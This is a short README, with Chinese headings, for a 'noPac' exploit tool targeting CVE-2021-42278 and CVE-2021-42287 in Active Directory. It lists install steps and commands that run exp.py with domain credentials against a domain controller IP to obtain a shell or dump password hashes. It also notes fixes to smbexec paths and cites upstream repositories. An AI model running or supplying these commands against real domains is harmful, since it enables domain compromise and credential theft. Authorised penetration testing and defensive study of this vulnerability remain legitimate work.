# noPac
Exploiting CVE-2021-42278 and CVE-2021-42287

# 使用
```
pip3 install -r requirements.txt
# GetShell
python3 exp.py "domain/Username:Passw0rd" -dc-ip 192.168.0.254 -shell
# DumpHash
python3 exp.py "domain/Username:Passw0rd" -dc-ip 192.168.0.254 -dump
```

# 修改
- 修改了原版作者在Kali下的smbexec等执行路径问题
- 修改模拟上线主机名

# 参考
https://github.com/cube0x0/noPac
https://github.com/WazeHell/sam-the-admin
